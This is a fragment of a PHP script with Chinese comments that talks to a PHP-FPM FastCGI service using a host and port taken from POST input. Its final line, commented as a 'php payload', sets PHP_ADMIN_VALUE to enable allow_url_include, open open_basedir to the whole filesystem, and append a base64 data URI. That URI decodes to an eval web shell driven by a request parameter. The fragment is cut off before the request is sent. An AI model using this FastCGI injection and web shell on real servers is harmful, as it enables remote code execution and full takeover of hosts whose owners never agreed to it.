...
/**
 * 解析连接字符串，支持 TCP 地址和 Unix Socket。
 *
 * @param string $host 连接字符串（如 '127.0.0.1:9000' 或 'unix:///run/php/php7.4-fpm.sock'）
 * @return array 解析后的连接信息数组，包含 'type' 和其他相关键
 * @throws Exception 如果连接字符串格式无效
 */

//function parsehost($host)
//{
    // 如果连接字符串以 'unix://' 开头，则解析为 Unix Socket
//    if (strpos($host, 'unix://') === 0) {
//        return [
//            'type' => 'unix',            // 连接类型为 Unix Socket
//            'path' => substr($host, 7) // 获取 Unix Socket 路径
//        ];
//    }
    // 如果连接字符串包含 ':'，则解析为 TCP 地址
//    elseif (strpos($host, ':') !== false) {
//        list($host, $port) = explode(':', $host);
//        return [
//            'type' => 'tcp',            // 连接类型为 TCP
//            'host' => $host,            // 主机地址
//            'port' => (int)$port        // 端口号，转换为整数
//        ];
//    } else {
//        throw new Exception("Invalid connection string format."); // 无效的连接字符串格式
//    }
//}

// 设置连接字符串，可切换为 TCP 地址或 Unix Socket
    echo "host=127.0.0.1 or unix:///tmp/php7.4-fpm.sock";
    echo "port=9000 or -1\n";
    $host = $_POST['host'] ; // 或 'unix:///run/php/php7.4-fpm.sock'
    $port = $_POST['port'] ;


    // 解析连接字符串，获取连接信息
    //$connectionInfo = parsehost($host);
    //$host='unix:///tmp/php-cgi-php-7.4.sock';
    //$port=-1;
    $content = "";
    $filepath = __FILE__;
    ...
    // 创建一个新的 FastCGI 客户端实例
    $client = new Client($host, $port);


    // 配置请求参数
    $PHP_ADMIN_VALUE = "allow_url_include = On\nopen_basedir = /\nauto_append_file = 'data://text/plain;base64,PD9waHAgQGV2YWwoJF9SRVFVRVNUW3Rlc3RdKTsgPz4='";    //php payload
